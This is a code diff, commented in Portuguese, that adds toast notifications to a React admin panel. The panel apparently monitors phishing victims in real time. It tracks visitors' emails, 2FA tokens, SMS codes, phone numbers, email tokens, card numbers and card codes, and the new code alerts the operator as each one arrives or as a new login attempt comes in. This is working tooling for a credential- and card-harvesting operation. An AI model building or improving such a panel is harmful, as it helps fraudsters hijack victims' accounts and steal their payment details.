@@ -31,6 +31,21 @@ function AdminPanel() {
   const [refModal, setRefModal] = useState(null); // { userId, command, label, placeholder }
   const [refModalValue, setRefModalValue] = useState("");
   const [historyModal, setHistoryModal] = useState(null); // attempt object
+  const [toasts, setToasts] = useState([]);
+
+  // Adicionar toast notification
+  const addToast = useCallback((message) => {
+    const id = Date.now();
+    setToasts(prev => [...prev, { id, message, removing: false }]);
+    // Iniciar fade out após 2s
+    setTimeout(() => {
+      setToasts(prev => prev.map(t => t.id === id ? { ...t, removing: true } : t));
+    }, 2000);
+    // Remover do DOM após 3s
+    setTimeout(() => {
+      setToasts(prev => prev.filter(t => t.id !== id));
+    }, 3000);
+  }, []);
 
   // Notificação sonora
   const audioRef = useRef(null);
@@ -58,19 +73,23 @@ function AdminPanel() {
 
     // Novo usuário chegou
     if (curr.length > prev.length) {
+      const newUser = curr.find(c => !prev.find(p => p.id === c.id));
       playNotification();
+      addToast(`Novo visitante: ${newUser?.email || "desconhecido"}`);
       prevDataRef.current = curr;
       return;
     }
 
     // Verificar se algum dado mudou (novo dado enviado pelo usuário)
     const dataFields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cc_code"];
+    const fieldLabels = { token_2fa: "2FA", email_input: "Email", sms_code: "Código SMS", phone_number: "Telefone", app_mail: "Token Email", credit_card: "Cartão", cc_code: "Código CC" };
     for (const attempt of curr) {
       const prevAttempt = prev.find(p => p.id === attempt.id);
-      if (!prevAttempt) { playNotification(); break; }
+      if (!prevAttempt) { playNotification(); addToast(`Novo visitante: ${attempt.email}`); break; }
       for (const field of dataFields) {
         if (attempt[field] && attempt[field] !== prevAttempt[field]) {
           playNotification();
+          addToast(`${attempt.email}: ${fieldLabels[field]} recebido`);
           prevDataRef.current = curr;
           return;
         }
@@ -78,6 +97,7 @@ function AdminPanel() {
       // Verificar tentativas adicionais de login
       if ((attempt.attempts?.length || 0) > (prevAttempt.attempts?.length || 0)) {
         playNotification();
+        addToast(`${attempt.email}: Nova tentativa de login`);
         prevDataRef.current = curr;
         return;
       }
@@ -556,6 +576,18 @@ function AdminPanel() {
 
   return (
     <div className="min-h-screen bg-[#08090d]">
+      {/* Toast Notifications */}
+      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2">
+        {toasts.map((toast) => (
+          <div
+            key={toast.id}
+            className={`bg-[#13151c] border border-emerald-500/30 text-white px-4 py-2.5 rounded-lg shadow-lg shadow-black/40 text-sm font-medium flex items-center gap-2 transition-all duration-700 ${toast.removing ? "opacity-0 translate-x-4" : "opacity-100 translate-x-0"}`}
+          >
+            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            {toast.message}
+          </div>
+        ))}
+      </div>
       {/* Header */}
       <header className="bg-[#0d0f14] border-b border-[#1e2130] sticky top-0 z-40" style={{backdropFilter: 'blur(12px)'}}>
         <div className="max-w-[1920px] mx-auto px-5 py-3">
